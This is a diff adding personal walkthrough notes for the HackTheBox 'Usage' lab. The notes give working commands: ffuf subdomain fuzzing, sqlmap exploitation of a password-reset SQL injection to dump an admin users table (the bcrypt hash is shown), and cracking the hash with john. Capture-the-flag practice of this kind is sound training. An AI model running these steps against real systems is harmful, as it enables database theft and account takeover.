@@ -54,6 +54,23 @@ inner network email phishing
 ```
 
 ## HTB: Usage 10 Aug 2024
+```
+1. fuzz subdomain by cmd: ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://usage.htb/ -H 'Host: FUZZ.usage.htb' -fs 178. find admin.usage.htb
+2. find SQL injection point at password reset page.
+3. copy the POST request and save it in a file called reset.req
+4. run sqlmap cmd: sqlmap -r reset.req -p email --batch (shows need higher level)
+5. user highrer level of sqlmap: sqlmap -r reset.req -p email --batch --level 3 (shows vulnerable to boolean-based blind and time-based blind)
+6. get a list of the available databases using the --dbs flag: sqlmap -r reset.req -p email --batch --level 3 --dbs
+	(faster by --threads= flag)   (get 3 dbs, one is "usage_blog")
+7. enumerate tables in database "usage_blog": sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10
+	(got 15 tables, one is "admin_users")
+8. Dump the "admin_users" table: sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump
+	(got: | 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |)
+9. save "$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2" to hash.txt
+10. Crack it using john: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+```
+
 
 ## HTB: Monitored 11 May 2024
 
